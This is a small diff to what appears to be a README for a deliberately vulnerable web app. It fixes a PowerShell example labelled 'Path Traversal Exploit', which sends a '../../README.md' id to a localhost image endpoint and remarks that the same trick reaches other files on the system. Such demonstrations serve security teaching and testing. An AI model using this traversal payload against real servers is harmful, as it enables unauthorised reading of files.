@@ -23,7 +23,7 @@ To make the following requests, I build HTTP Requests using Powershell's Invoke-
 1. Path Traversal Exploit:
 
    ```PowerShell
-   $postParams = @{id="../../README.md"} \n
+   $postParams = @{id="../../README.md"}
    Invoke-WebRequest -Uri http://localhost:80/img -Method GET -Body $postParams
    ```
    This example specifically hits this README, but you can use this to access further files on the user's system.
